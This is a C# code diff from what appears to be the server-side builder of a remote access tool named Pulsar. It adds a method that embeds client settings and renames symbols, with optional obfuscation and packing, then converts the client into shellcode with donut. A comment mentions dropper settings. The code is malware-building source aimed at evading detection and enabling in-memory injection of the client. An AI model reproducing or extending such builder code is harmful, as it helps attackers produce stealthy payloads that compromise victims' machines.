@@ -2,6 +2,7 @@
 using Mono.Cecil.Cil;
 using Pulsar.Common.Cryptography;
 using Pulsar.Server.Models;
+using Pulsar.Server.Helper;
 using System;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
@@ -101,6 +102,54 @@ namespace Pulsar.Server.Build
                 IconDirectoryResource iconDirectoryResource = new IconDirectoryResource(iconFile);
                 iconDirectoryResource.SaveTo(_options.OutputPath);
             }
+        }
+
+        public void BuildShellcode(bool obfuscateBuild, bool packBuild)
+        {
+            if (!File.Exists(Path.Combine(System.Reflection.Assembly.GetExecutingAssembly().Location, "donut.exe")))
+                throw new Exception("Donut not found! Shellcode conversion not possible. Try building with donut");
+            using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
+            {
+                // PHASE 1 - Writing Settings (WARNING: WE NEED TO REMOVE STARTUP AND OTHER DROPPER SETTINGS)
+                WriteSettings(asmDef);
+
+                // PHASE 2 - Obfuscation
+
+                Renamer r = new Renamer(asmDef);
+
+                if (!r.Perform())
+                    throw new Exception("renaming failed");
+
+                MemoryStream stream = new MemoryStream();
+                asmDef.Write(stream);
+                stream.Position = 0;
+                asmDef.Dispose();
+
+                byte[] buffer = stream.ToArray();
+
+                if (obfuscateBuild)
+                {
+                    Obfuscator.Obfuscator obf = new Obfuscator.Obfuscator(buffer);
+                    obf.Obfuscate();
+                    buffer = obf.Save();
+                }
+                if (packBuild)
+                {
+                    TinyLoader.TinyLoader tinyLoader = new TinyLoader.TinyLoader(buffer);
+                    tinyLoader.Pack();
+                    buffer = tinyLoader.Save();
+                }
+                File.WriteAllBytes(_options.OutputPath + ".exe", buffer);
+            }
+            // PHASE 3 - Shellcode
+            ShellcodeBuilder.GenerateShellcode(
+                _options.OutputPath + ".exe",
+                "Pulsar.Client.Program",
+                "Main",
+                _options.OutputPath,
+                false
+            );
+            File.Delete(_options.OutputPath + ".exe");
         }
 
         private void WriteSettings(AssemblyDefinition asmDef)
